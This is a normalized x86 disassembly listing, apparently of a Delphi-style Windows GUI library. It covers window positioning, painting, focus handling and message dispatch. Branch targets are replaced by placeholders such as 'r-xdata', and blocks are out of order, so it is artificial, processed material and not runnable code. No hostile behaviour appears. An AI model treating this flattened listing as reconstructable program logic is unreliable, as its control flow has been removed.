mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_445248
call sub_4413b8
inc edi
dec esi
jne r-xdata
sub_445a5c
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_445a78
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_4161a0
call sub_445a78
inc edi
dec esi
jne r-xdata
sub_445ad8
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_4038bc
mov ebx eax
mov eax edi
call sub_445a78
mov eax edi
call sub_445c14
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_445b18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_445bee
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_442f30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4161a0
call sub_445b18
inc esi
dec ebx
jne r-xdata
sub_445c14
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_445b18
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_445c54
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_445a78
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_445c14
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_4074c0
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_442f30
jmp r-xdata
sub_445cdc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_445d34
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_445d23
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445d2a
call sub_44078c
call sub_4259b8
retn
sub_445d54
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_414b3c
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_4074a8
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_442f30
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_445e0c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_4161a0
call sub_445d54
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_4161a0
call sub_445d54
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_445ea0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov edi eax
mov eax edi
call sub_448484
mov ebx eax
call GetCapture
cmp ebx eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_407494
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax edi
call sub_445e0c
mov ebx eax
xor ebx ebx
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_4074a8
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_442f30
mov [ esi + 0xc ] eax
mov al 0x1
xor eax eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp edi [ eax + 0x30 ]
jne r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_445f34
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_4424ec
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_442ffc
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_445ea0
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_407494
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_4418a8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_445e0c
test eax eax
je r-xdata
mov eax ebx
call sub_4592cc
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_442ffc
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe4 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_448788
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_448484
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_448484
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_442f30
sub_446098
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_443194
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_442f30
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_421054
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_421cd8
call sub_421054
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_421d14
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_441904
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_4461a0
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_43ec78
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_442f30
mov [ esi + 0xc ] eax
mov bl 0x1
sub_4461d4
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_4462f4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_446330
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4462fb
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4161a0
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_446304
push esi
add esp 0xfffffff0
mov esi eax
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor eax eax
mov [ esp + 0x8 ] eax
xor eax eax
mov [ esp + 0xc ] eax
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
pop esi
retn
sub_446330
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_4161fc
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_4161a0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_414b64
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_4161a0
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0x80000010
call sub_421054
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_414b64
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0x80000014
call sub_421054
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_414b64
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_4406a0
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_442f30
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_446560
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_4406a0
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_448484
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_448484
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_442f30
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_442f30
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4406a0
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_446560
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_4161a0
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_4466b4
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4461d4
jmp r-xdata
mov eax ebx
call sub_445284
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_446806
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_448484
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_442f30
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_4466b4
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_448484
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_446814
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_4461a0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_446834
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_4461a0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4468a8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_4461a0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4468c8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_4461a0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4468e8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4461a0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44690c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4461a0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_446930
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4461a0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_446954
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4461a0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_446978
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ esi + 0x1f8 ] 0x0
je r-xdata
mov eax [ esi + 0x170 ]
call sub_421d14
push eax
lea edx [ esp + 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax [ ebx + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov [ ebx + 0xc ] 0x1
add esp 0x10
pop esi
pop ebx
retn
sub_4469c4
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_443868
test bl bl
je r-xdata
mov eax edi
call sub_448794
mov eax edi
call sub_44838c
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_44838c
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_446a84
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_4434c4
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_446ad4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_448794
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_444e14
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_4038bc
sub_446b1c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
